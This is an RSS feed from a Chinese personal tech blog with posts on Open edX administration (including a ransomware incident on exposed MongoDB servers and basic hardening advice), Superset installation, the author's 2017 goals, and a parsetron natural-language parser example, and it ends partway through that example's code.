<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writing for time</title><link>/</link><description></description><atom:link href="/feeds/wuwenjie.rss.xml" rel="self"></atom:link><lastBuildDate>Thu, 05 Jan 2017 00:00:00 +0000</lastBuildDate><item><title>open edx近期笔记(2017.01)</title><link>/edx-note_2017_1_5.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/edx_2017db69fa1e.png" /&gt;&lt;/p&gt;
&lt;h3&gt;OpenedX安全相关&lt;/h3&gt;
&lt;p&gt;本周(2017.1.5)在&lt;code&gt;Open edX开发研究&lt;/code&gt;群里有2家公司/1所高校的系统被攻击(这是已知的，不清楚是否有更多案例),涉及的open edx版本包括D版和E版，造成mongo数据库被删(edxapp和cs_comments_service_development)，群里一番讨论下来，原因主要是以下两点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发者未修改ansible脚本的mongo密码&lt;/li&gt;
&lt;li&gt;mongo端口外部可访问（阿里云默认所有端口开放，青云相反）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本次攻击的动机是勒索，攻击者先删除数据，留下信息说交0.2个比特币，将恢复数据。好在大家都有做好数据备份,暂无经济损失.&lt;/p&gt;
&lt;p&gt;安全方面，建议做些基本防范，就服务器层面而言：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用ssh key登陆，禁用密码登陆（如果你一定要用密码登陆，提高密码强度，并修改ssh端口）&lt;/li&gt;
&lt;li&gt;修改安装脚本中的默认密码&lt;/li&gt;
&lt;li&gt;服务器只对外暴露http端口(80/443)和ssh端口(默认是22，可以修改)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mongo数据库迁移&lt;/h3&gt;
&lt;p&gt;mongo用久了，数据会占据极大的空间，关于这块，网上讨论很多:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/6263729/mongodb-file-size-is-huge-and-growing"&gt;MongoDB - file size is huge and growing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/13845661/mongodb-file-size-too-big"&gt;MongoDB file size too big&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/19533019/is-it-safe-to-delete-the-journal-file-of-mongodb"&gt;Is it safe to delete the journal file of mongodb?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对新手而言，一种简易做法是：&lt;code&gt;db.repairDatabase()&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;如果你没用把握，对数据库做操作前最好做个备份&lt;/p&gt;
&lt;p&gt;我的edx实例中mongo数据库文件(/edx/var/mongo/mongodb)为8.8G大小，我最近想把它迁移到了外挂盘上，试了几种办法，目前只有软链接有效，大多教程建议的：修改mongo配置文件（修改/etc/mongod.conf中的&lt;code&gt;dbpath=/edx/var/mongo/mongodb&lt;/code&gt;）始终无效，原因不明&lt;/p&gt;
&lt;p&gt;我把有效操作列出如下(这个操作由@dsl完成)：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo mv /edx/var/mongo/mongodb /path/to/mongodb
sudo ln -s /path/to/mongodb /edx/var/mongo/mongodb  # 在建立软链接之前先保证/edx/var/mongo这个路径下面已经没有mongodb这个文件夹
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;视频集成&lt;/h3&gt;
&lt;p&gt;修改cms/envs/common.py 中的&lt;code&gt;MAX_ASSET_UPLOAD_FILE_SIZE_IN_MB = 10&lt;/code&gt;,单位是MB,修改为你允许的上传文件大小，就可以直接在studio里上传视频了。&lt;/p&gt;
&lt;p&gt;注：用于早期的实验或小规模使用没用问题，如果是长期使用，建议使用云平台或是搭建流媒体服务器&lt;/p&gt;
&lt;h3&gt;镜像扩容&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://edustack.org/"&gt;edustack.org&lt;/a&gt;发布的OpenedX D镜像默认空间为20G（E版默认为500G）,D版本无法满足日常需求，对于想扩容的新司机来说，在虚拟机里扩容还挺麻烦的.我这边已将D版本扩容为500G,本来写在这里，发现步骤太多，就不放过来了，建议大家直接使用E版本&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 05 Jan 2017 00:00:00 +0000</pubDate><guid>tag:,2017-01-05:edx-note_2017_1_5.html</guid><category>edx</category></item><item><title>superset使用笔记</title><link>/superset_note.html</link><description>&lt;h1&gt;superset是什么&lt;/h1&gt;
&lt;p&gt;superset马甲比较多，它曾经叫过:&lt;code&gt;Panoramix&lt;/code&gt;，&lt;code&gt;Caravel&lt;/code&gt;， &lt;/p&gt;
&lt;p&gt;关于入门和介绍可以我此前的文章:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-startup-and-install.html"&gt;caravel系列之安装与入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-config.html"&gt;caravel系列之简易配置/定制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-demo-analysis.html"&gt;caravel系列之案例讲解与分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-code.html"&gt;caravel系列之架构与源码浅析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近公司想用新版本中的SQL Lab的功能，于是我将caravel升级到superset。在此做个笔记&lt;/p&gt;
&lt;p&gt;除了增加了几个新特性，变化不大，此前写的caveral文章基本可用，如果遇到问题，参考&lt;a href="http://airbnb.io/superset/installation.html"&gt;官方文档&lt;/a&gt;即可&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;安装基本没坑，跟着&lt;a href="http://airbnb.io/superset/installation.html"&gt;官方教程&lt;/a&gt;做就行&lt;/p&gt;
&lt;p&gt;我是ubuntu系统，所以安装过程为：&lt;/p&gt;
&lt;h3&gt;安装依赖&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install build-essential libssl-dev libffi-dev python-dev python-pip libsasl2-dev libldap2-dev
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;安装与初始化&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Install superset
pip install superset

# Create an admin user
fabmanager create-admin --app superset

# Initialize the database
superset db upgrade

# Load some data to play with
superset load_examples

# Create default roles and permissions
superset init

# Start the web server on port 8088
superset runserver -p 8088 -a 0.0.0.0 # -a 0.0.0.0使其允许外部访问

# To start a development web server, use the -d switch
# superset runserver -d
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;简单配置&lt;/h3&gt;
&lt;p&gt;配置方法和&lt;a href="http://blog.just4fun.site/caravel-config.html"&gt;caravel系列之简易配置/定制&lt;/a&gt;相同，只需要把配置文件名由&lt;code&gt;caravel_config.py&lt;/code&gt;改为&lt;code&gt;superset_config.py&lt;/code&gt;即可&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 05 Jan 2017 00:00:00 +0000</pubDate><guid>tag:,2017-01-05:superset_note.html</guid><category>data</category></item><item><title>2017年小目标</title><link>/2017-plan.html</link><description>&lt;p&gt;本来还想以一句略带伤感的诗句开头&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一年将尽夜 ， 万里未归人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可惜昨晚回的迟，回来把菊斋里岁末感慨和结集刷一下，就来不及写新年计划了，今天补上&lt;/p&gt;
&lt;p&gt;2016年做了一些自己觉得好玩的西，沉浸在代码里，不知有汉，无论魏晋&lt;/p&gt;
&lt;p&gt;先做个2016年小节&lt;/p&gt;
&lt;h1&gt;2016年&lt;/h1&gt;
&lt;p&gt;只谈技术方面，16年的计划就大方向而言基本达成，就程度而言，超出预期。简单总结的话，大概会用：求仁得仁&lt;/p&gt;
&lt;p&gt;求仁得仁似乎隐含着"但是"--除了所求的方面其他方面并不怎样。我的"但是"是 ，出游少了，读书少了，人际方面也疏于打理&lt;/p&gt;
&lt;p&gt;去年年底还能在《近况》里说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;惭愧半年音讯无，溺于风景溺于书&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今年真是只剩惭愧了：漂移板只学会平衡，还没法上路，口琴也疏于练习，还是两只老虎水平&lt;/p&gt;
&lt;p&gt;这些俱是16年留下的遗憾&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;技术方面，主要在做以下几块&lt;/p&gt;
&lt;h3&gt;系统架构&lt;/h3&gt;
&lt;p&gt;总算把折腾了2年多的OpenedX架构吃透，近十个子系统构成，近百万行代码&lt;/p&gt;
&lt;p&gt;直到今年才有豁然开朗的感觉，之前都是只见树木不见森林&lt;/p&gt;
&lt;p&gt;下半年在@MT组织的open edx beijing meetup 中做了个主题分享:OPEN EDX ARCHITECTURE，自觉思路还算清晰，整体的架构分析在我的演讲稿里: &lt;a href="https://github.com/wwj718/presentation-edx"&gt;presentation-edx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在系统设计中，从edx这边学来的架构风格，对我帮助很大，异构系统的整合手段(CAS/OAuth2)、高内聚低耦合的组件设计（服务化）、如何做好组件分布式，这些设计大型系统的常见问题，edx都给出了很漂亮的解决方案，是个绝佳的活体标本和现实教材。&lt;/p&gt;
&lt;p&gt;在我参与的项目里，我试着用从OpenedX这里学来的经验做架构设计和原型构建，得心应手，毕竟很少有系统复杂到OpenedX这种程度&lt;/p&gt;
&lt;p&gt;这些项目包括：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;*  公司内部的两个项目
*  blockly4pi(cloud) （因为这个项目目前公司在用，暂时不方便开源，之后可能会直接发布为操作系统）
*  paperweekly_forum (在我的github上，为paperweekly构建的论坛／微信群通信解决方案)
*  mba.ai
*  ai/nlp相关的一个创业项目，目标是实现api.ai的friendly版本，因为朋友的创业公司在用，所以这个项目也暂不方便开源
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;AI/NLP&lt;/h3&gt;
&lt;p&gt;AI/NLP这是我今年的兴趣之一，起初在Coursera上跟着吴恩达学习&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;,后来跟着github上的一些项目做些入门实践，以熟悉基本的工具和流程&lt;/p&gt;
&lt;p&gt;这些是我的学习资料:&lt;a href="http://blog.just4fun.site/machine-leanring-and-ai.html"&gt;机器学习与人工智能(我的学习资料)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今年最有趣的事情之一，恐怕要算和paperweeky的结识，paperweekly是个有趣而友好的地方，大家每周一起读论文，分享心得，气氛活跃而融洽&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PaperWeekly是一个由50多名喜欢分享知识的童鞋利用宝贵的业余时间来一起，以一周为单位、对一个topic进行多篇paper解读和对比总结的、不追求热点、不搞些噱头的爱心公益组织，旨在分享知识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为写了&lt;a href="https://github.com/wwj718/paperweekly_forum"&gt;paperweekly_forum&lt;/a&gt;这个简单工具，结识了paperweekly中许多折腾ai／nlp的小伙伴（昨天在新巴克与素未谋面@xxj不期而遇，聊得十分投缘，巧得可以单独作为一篇故事来写）。他们大多是折腾基础算法、论文和学术的博士，踏实、低调而优秀&lt;/p&gt;
&lt;p&gt;关于AI/NLP这块我做的一些有趣项目做个罗列：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;做了几个好玩的bot，诸如用自然语言查询火车票的&lt;a href="https://github.com/wwj718/ibot"&gt;ibot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;使用chatterbot构建的本地bot：deepthought&lt;/li&gt;
&lt;li&gt;使用微信控制的树莓派bot......这些项目都在我的博客和github里，全部开源，有兴趣的小伙伴可以自己跑起来玩&lt;/li&gt;
&lt;li&gt;hack了siri做的 &lt;a href="http://blog.just4fun.site/rpi-siri-close-light.html"&gt;hi siri 关灯&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;把yige.ai作为可视化组件，降低用户门槛&lt;/li&gt;
&lt;li&gt;完成openbot基本架构，这个项目致力于成为nlu server和用户之间的通用胶水层，bot server被设计为可插拔的，接入之后即可对用户提供nlu服务（我认为这块的基础服务高度同构，抽象出来不难），这个项目主要将组件之间的接口、restful api和多语言sdk做得通用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;硬件／黑客&lt;/h3&gt;
&lt;p&gt;我的硬件平台选择树莓派，和许多硬件黑客一样，偏好友好而可爱的树莓派和python&lt;/p&gt;
&lt;p&gt;@李老师帮我补上了许多硬件知识，关于李老师其人，可以参考：&lt;a href="http://blog.just4fun.site/rpi-siri-close-light.html"&gt;这篇文章&lt;/a&gt;，2016年夏天@ysy将离南京，有天问我将来想做的事情有哪些，我说我想成为一名黑客（&lt;a href="http://blog.just4fun.site/Hackers-Heroes-of-the-Computer-Revolution.html"&gt;黑客:计算机革命的英雄&lt;/a&gt;这本书谈论的那种黑客），我又补充说，最好也能成为硬件黑客。&lt;/p&gt;
&lt;p&gt;因为李老师的缘故，不敢妄称硬件黑客，但我觉得李老师把我带入门了&lt;/p&gt;
&lt;p&gt;前头的几个ai／nlp项目也大多和硬件有关&lt;/p&gt;
&lt;p&gt;黑客领域（无论就哪种定义而言）相关的知识，带有一种探索和逻辑拼图式的乐趣，这方面有许多有趣的项目，我在本地做过不少实验，尽管是在本地系统作渗透测试，手握一些强大的工具时，依然能体验到古龙式的剑气横霄&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;2017年小目标&lt;/h1&gt;
&lt;p&gt;下边列出17年的小目标，有些有趣的项目，如果大家有兴趣，欢迎一起来折腾&lt;/p&gt;
&lt;h3&gt;开源&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;发布硬件模块积木化／图形化的操作系统(基于树莓派/rasbian)&lt;/li&gt;
&lt;li&gt;继续完善openbot，使其成为通用的nlu 服务骨架，接入nlu server即可给用户提供友好的交互"界面"(web／RESTful api／sdk)&lt;/li&gt;
&lt;li&gt;作为普通用户试用国外优质的bot，找个喜欢的，试着用国内的nlu服务（yige.ai/芝麻），模仿着做一个中文版本的实现&lt;/li&gt;
&lt;li&gt;把之前做过的硬件玩具／bot，整理进同一个项目，作为智能家居解决方案，思路和扎尔伯格德Jarvis很像&lt;/li&gt;
&lt;li&gt;继续完善&lt;a href="https://github.com/wwj718/paperweekly_forum"&gt;paperweekly_forum&lt;/a&gt;，把todo list里挖坑填完&lt;ul&gt;
&lt;li&gt;语意挖掘&lt;/li&gt;
&lt;li&gt;数据分析&lt;/li&gt;
&lt;li&gt;有趣的彩蛋&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;填deepthought挖的坑，估计一年填不完&lt;/li&gt;
&lt;li&gt;用TensorFlow重写稻香老农的作诗机，之后带到菊斋玩耍&lt;/li&gt;
&lt;li&gt;对联和格律诗具有清晰的规则和语法结构（平仄／对偶），比普通自然语言要更规则，似乎更好处理，试试神经网络来处理这块&lt;ul&gt;
&lt;li&gt;就对联而言，可以使用笠翁对韵／声律启蒙,作为预料库，质量非常高&lt;/li&gt;
&lt;li&gt;诗词的话，我更有兴趣用菊斋的优秀诗集训练它。欧，我喜欢的《月出集》、《千山集》、《空花集》、《藏海集》、《覆水集》... !&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把场景限制在小范围，如硬件（智能家居），试着使用parsetron和Pyparsing实现本地的中文语义解析&lt;/li&gt;
&lt;li&gt;pi4bb8: 使用树莓派控制bb8&lt;/li&gt;
&lt;li&gt;orang3_cn: orange中文版与社区&lt;/li&gt;
&lt;li&gt;edustack/openedx&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;自由职业者&lt;/h3&gt;
&lt;p&gt;2017年我有计划成为自由职业者。曾老师(@MT)很早就给过我这方面的建议，我一直在做准备，包括对自由时间的把控（自律带来自由）、对分布式办公的熟悉，我周末参与的开源项目和帮衬朋友的创业项目，基本是通过异地协作完成，工作流已经很熟悉&lt;/p&gt;
&lt;p&gt;@Eric这次去硅谷前来南京找了我一次，他也支持我成为自由职业者，@Eric自己的公司也打算实践更多的分布式协作&lt;/p&gt;
&lt;p&gt;今天下午和来自Mozilla的@tanghong聊，她很乐意接受我成为自由职业者为她们提供服务。&lt;/p&gt;
&lt;p&gt;我自己重新思考这个问题，觉得时机也差不多了&lt;/p&gt;
&lt;p&gt;对照着&lt;a href="https://book.douban.com/subject/26835090/"&gt;软技能&lt;/a&gt;给自由职业者的几点建议看了下，基本都满足：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从认识的人做起。希望我提供服务的多是技术社区里认识的朋友，或是朋友介绍的，他们订阅我的博客，或是使用我的源码，大家互相熟悉、信任。能力方面也知悉&lt;/li&gt;
&lt;li&gt;就任务而言，基本填满我的日常时间，需要拒绝一些才能应对。&lt;/li&gt;
&lt;li&gt;这些任务恰好是我擅长的（架构和原型构建）。就价值创造而言，能集中精力在刀刃上，帮助更多人／团队处理自己熟悉的问题域中的问题&lt;/li&gt;
&lt;li&gt;项目基本都有主动的议价能力&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;团队&lt;/h3&gt;
&lt;p&gt;无法立马成为自由职业者的一个主要理由是手头暂时带着团队。@TG(现在的老板)近来太忙，他之前直接负责我手头的这个项目（他对此很感兴趣），近期公司整体上进展良好，他没法再抽出经历在具体项目上，团队（10人左右的小团队）目前完全交由我代为管理（之前我只负责技术）&lt;/p&gt;
&lt;p&gt;我一直对从技术转为管理兴趣不大，怕影响到编程时间（琐事太多），这回实在不好拒绝，只好承诺暂为代理&lt;/p&gt;
&lt;p&gt;最近试着学些简单的管理技能，曾老师和eric都推荐过一些书，平时遇到问题就请教@TG，许多知识，真是纸上得来终觉浅&lt;/p&gt;
&lt;p&gt;我很喜欢的一句建议包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;帮助他人取得成功&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;分解问题，设立明确的目标&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;招聘的首要目的是招到合适的人而不是最牛的人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;保持透明和开放&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在此期间，一边学习如何与管队协作和磨合，一边像学技术一样，准备记下学习笔记&lt;/p&gt;
&lt;h3&gt;阅读&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;分析哲学 &lt;ul&gt;
&lt;li&gt;罗素／维特根斯坦&lt;/li&gt;
&lt;li&gt;关注一下关于语言／语义处理这块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;乔姆斯基&lt;/li&gt;
&lt;li&gt;中国哲学史&lt;/li&gt;
&lt;li&gt;深度学习&lt;/li&gt;
&lt;li&gt;自然语言处理&lt;/li&gt;
&lt;li&gt;科幻小说&lt;/li&gt;
&lt;li&gt;其他领域的知识（技术之外）&lt;ul&gt;
&lt;li&gt;商业&lt;/li&gt;
&lt;li&gt;法律&lt;/li&gt;
&lt;li&gt;人际&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;写作&lt;/h3&gt;
&lt;p&gt;今年本来想参与两本书的写作，其一是@曾老师筹划的open edx相关技术书籍，另一个是@mg的与spark相关的教程（我负责web这块）。&lt;/p&gt;
&lt;p&gt;皆因时间问题，无法完成。&lt;/p&gt;
&lt;p&gt;希望今年如果是自由职业，能抽出足够的时间，把过去积累的博文和项目梳理成章&lt;/p&gt;
&lt;h3&gt;爱好&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;漂移板&lt;/li&gt;
&lt;li&gt;音乐&lt;ul&gt;
&lt;li&gt;布鲁斯口琴&lt;/li&gt;
&lt;li&gt;打击乐&lt;ul&gt;
&lt;li&gt;想加入一个本地的地下乐队，与一群发烧友们一起玩耍，可以从打杂开始，或者从帮忙调节电子设备开始&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加入geek社团群体 ， 与一群发烧友共事&lt;/li&gt;
&lt;li&gt;健身（列出计划）&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 01 Jan 2017 00:00:00 +0000</pubDate><guid>tag:,2017-01-01:2017-plan.html</guid><category>杂感</category></item><item><title>openbot之自然语言解析器</title><link>/openbot-natural-language-parser.html</link><description>&lt;blockquote&gt;
&lt;p&gt;行程才是目的，顿悟在每日的实践中 --《UNIX设编程艺术》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;openbot&lt;/h1&gt;
&lt;p&gt;openbot是我的业余项目，对NLP和AI的兴趣由来已久，想通过造轮子的方式来学习&lt;/p&gt;
&lt;p&gt;我是api.ai的忠实用户，也使用wit.ai（给这个项目的client提交过源码）。国内的yige.ai也很棒。openbot的web/sdk接口模仿着它们设计&lt;/p&gt;
&lt;p&gt;openbot最初作为&lt;a href="https://github.com/wwj718/deepThought"&gt;deepThought&lt;/a&gt;的衍生项目，相关思路可以参考：&lt;a href="https://github.com/wwj718/deepThought#衍生计划"&gt;deepThought#衍生计划&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;后来觉得我的兴趣更多在架构，我日常接触的更多的也是架构，想把它变为一个通用的框架：这个框架提供通用的webapp，对外提供restful api，也提供各个语言的sdk以便开发者集成，目前完成了python sdk，nodejs的正在编写&lt;/p&gt;
&lt;p&gt;近期在看《Unix编程艺术》，13.4部分在谈论emacs的设计哲学，作者把emacs视为一个框架，作者说到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当编制一个框架时，牢记分离原则：框架是机制，尽可能少地包含策略...尽可能多地将行为分解到使用框架的模块中去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我之前的架构简图如下&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/openbotda2fa65a.png" /&gt;&lt;/p&gt;
&lt;p&gt;openbot致力于将webapp和sdk做得开箱可用，而nlu可插拔，不限制实现策略，只要满足相关约定，即可插入到框架中对最终用户提供nlp服务,在结构图中，我以chatterbot作为bot server为例&lt;/p&gt;
&lt;p&gt;openbot项目近期没有开源，朋友的创业公司打算用它，如果之后合适，我会将其开源。&lt;/p&gt;
&lt;h1&gt;语法解析&lt;/h1&gt;
&lt;p&gt;轮子哥@vczh有句话在技术圈很有名&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;程序员的三大浪漫是编译原理，图形学和操作系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;编译原理确实一个有趣的话题，仅其中涉及的词法分析和语法分析就已十分迷人&lt;/p&gt;
&lt;p&gt;相较于解析编程语言（python程序员的入门资料可以参考&lt;a href="http://python3-cookbook.readthedocs.io/zh_CN/latest/c02/p18_tokenizing_text.html"&gt;字符串令牌解析&lt;/a&gt;），我对解析自然语言的兴趣更大些，一方面来自对人工智能的兴趣，另一方面来自一直关注的分析哲学流派，他们把大多哲学问题处理为语言问题，分析哲学阵营的路德维希.维特根斯坦有句名言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;语言的极限便是世界的极限   --《逻辑哲学论》 5.6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天的nlp领域同大多涉及智能的领域一样，基于统计/大数据。&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/Kitt-AI/parsetron"&gt;parsetron&lt;/a&gt;&lt;/h1&gt;
&lt;h3&gt;缘起&lt;/h3&gt;
&lt;p&gt;我在&lt;a href="http://blog.just4fun.site/rpi-siri-close-light.html"&gt;嘿 Siri 关灯&lt;/a&gt;里提到我需要一个自然语言解析器，我准备使用yige.ai来替代Siri，以实现跨平台使用。我又想把它运行在本地&lt;/p&gt;
&lt;p&gt;《嘿 Siri 关灯》是典型的nlp+硬件控制的案例（你可能想到扎尔伯格的&lt;a href="https://m.toutiao.com/i6366879371965235714/?tt_from=weixin_moments&amp;amp;utm_campaign=client_share&amp;amp;app=news_article&amp;amp;utm_source=weixin_moments&amp;amp;iid=6814510930&amp;amp;utm_medium=toutiao_android&amp;amp;wxshare_count=2&amp;amp;pbid=31547628651&amp;amp;from=timeline&amp;amp;isappinstalled=0"&gt;Jarvis&lt;/a&gt;），在我的场景中（使用自然语言驱动硬件），自然语言处理模块并不需要很强大，对话的模式也很简单，多是&lt;code&gt;嘿siri，把灯打开/把空调打开/把风扇打开&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Kitt.ai开放的&lt;a href="Parsetron"&gt;https://github.com/Kitt-AI/parsetron&lt;/a&gt;是个不错的选择，小巧而实用，可以一言不合就修改源码。&lt;/p&gt;
&lt;h3&gt;关于&lt;/h3&gt;
&lt;p&gt;parsetron是个非常有趣的项目，来自Kitt.ai&lt;/p&gt;
&lt;p&gt;parsetron将自己定位在一个足够小的领域（诸如我手头的硬件控制），这样需要处理的语言模式比较单一，绕开了nlp领域会遇到的大多复杂问题(许多问题在学术圈也依旧困难，遑论工程)&lt;/p&gt;
&lt;p&gt;parsetron是个典型的通过降低选择复杂度，让项目变得健壮而实用的案例，按照《UNIX编程艺术》的说法：通过选择合适的目标能有效降低复杂度&lt;/p&gt;
&lt;p&gt;人工智能在一个细分领域可能做得很好，可如果我们一开始提高人们的期望，把它定位在通用型AI，往往容易给人"人工智障"的感觉，目前好用的bot多是找了一个具体的小场景，这也符合UNIX哲学里的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do one thing and do well&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本文关注如何使用parsetron，之后有时间再分析&lt;a href="http://parsetron.kitt.ai/en/latest/quickstart.html#how-it-works"&gt;原理&lt;/a&gt;和&lt;a href="https://github.com/Kitt-AI/parsetron"&gt;源码&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;入门&lt;/h3&gt;
&lt;p&gt;安装很简单&lt;code&gt;pip install parsetron&lt;/code&gt;,目前只支持python2，parsetron没有任何外部依赖&lt;/p&gt;
&lt;p&gt;&lt;a href="http://parsetron.kitt.ai/en/latest/quickstart.html#simple-example"&gt;文档&lt;/a&gt;里的demo是非常好的入门案例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;parsetron&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Set&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Regex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;OneOrMore&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Grammar&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RobustParser&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LightGrammar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Grammar&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;change&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;set&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blink&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;light&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;top&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;middle&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bottom&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
